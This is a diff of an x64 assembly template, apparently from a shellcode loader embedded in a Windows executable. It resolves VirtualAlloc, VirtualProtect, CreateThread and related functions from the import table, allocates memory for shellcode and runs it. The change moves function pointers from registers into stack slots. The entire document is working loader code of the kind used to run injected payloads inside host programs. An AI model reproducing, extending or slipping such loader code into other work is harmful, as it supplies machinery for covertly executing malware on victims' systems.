@@ -3,12 +3,17 @@
 // rdi store address of ImageBaseAddress
 // rsi store address of kernel32.dll
 // rbx store address of LoadLibrary
-// r12 store address of GetProcAddress
-// r13 store address of VirtualAlloc
-// r14 store address of VirtualProtect
-// r15 store address of CreateThread
+// rbp store address of GetProcAddress
+// [rsp+16] store address of VirtualAlloc
+// [rsp+24] store address of VirtualFree
+// [rsp+32] store address of VirtualProtect
+// [rsp+40] store address of CreateThread
+// [rsp+48] store address of WaitForSingleObject
 
 entry:
+  // reserve stack for store variables
+  sub rsp, 56
+
 // get necessary procedure address
 {{if .LackProcedure}}
   // push kernel32 module name to stack
@@ -63,7 +68,7 @@ entry:
   // read the GetProcAddress form IAT
   mov {{.RegV.rax}}, {{.RegN.rdi}}
   add {{.RegV.rax}}, {{hex .GetProcAddress}}
-  mov {{.RegN.r12}}, [{{.RegV.rax}}]
+  mov {{.RegN.rbp}}, [{{.RegV.rax}}]
 
   // get procedure address of VirtualAlloc
   {{if .LackVirtualAlloc}}
@@ -80,15 +85,16 @@ entry:
     mov rcx, {{.RegN.rsi}}
     mov rdx, rsp
     sub rsp, 0x20
-    call {{.RegN.r12}}
+    call {{.RegN.rbp}}
     add rsp, 0x20
-    mov {{.RegN.r13}}, rax
+    mov [rsp+16], rax
     // restore stack for procedure name
     add rsp, 2*8
   {{else}}
     mov {{.RegV.rcx}}, {{.RegN.rdi}}
     add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
-    mov {{.RegN.r13}}, [{{.RegV.rcx}}]
+    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
+    mov [rsp+16], {{.RegV.rcx}}
   {{end}}
 
   // get procedure address of VirtualProtect
@@ -106,7 +112,7 @@ entry:
     mov rcx, {{.RegN.rsi}}
     mov rdx, rsp
     sub rsp, 0x20
-    call {{.RegN.r12}}
+    call {{.RegN.rbp}}
     add rsp, 0x20
     mov {{.RegN.r14}}, rax
     // restore stack for procedure name
@@ -133,7 +139,7 @@ entry:
       mov rcx, {{.RegN.rsi}}
       mov rdx, rsp
       sub rsp, 0x20
-      call {{.RegN.r12}}
+      call {{.RegN.rbp}}
       add rsp, 0x20
       mov {{.RegN.r15}}, rax
       // restore stack for procedure name
@@ -155,7 +161,8 @@ entry:
   // get procedure address of VirtualAlloc
   mov {{.RegV.rcx}}, {{.RegN.rdi}}
   add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
-  mov {{.RegN.r13}}, [{{.RegV.rcx}}]
+  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
+  mov [rsp+16], {{.RegV.rcx}}
   // get procedure address of VirtualProtect
   mov {{.RegV.rdx}}, {{.RegN.rdi}}
   add {{.RegV.rdx}}, {{hex .VirtualProtect}}
@@ -169,12 +176,13 @@ entry:
 {{end}} // LackProcedure
 
   // allocate memory for shellcode
+  mov {{.RegV.rax}}, [rsp+16]
   xor rcx, rcx
   mov rdx, {{hex .MemRegionSize}}
   mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
   mov r9, 0x04    // PAGE_READWRITE
   sub rsp, 0x20
-  call {{.RegN.r13}}
+  call {{.RegV.rax}}
   add rsp, 0x20
 
   // store allocated memory address
@@ -274,6 +282,9 @@ entry:
   sub rsp, 0x20
   call {{.RegV.rax}}
   add rsp, 0x20
+
+  // restore stack for store variables
+  add rsp, 56
 
   // mark the end of loader
   {{db .EndOfLoader}}
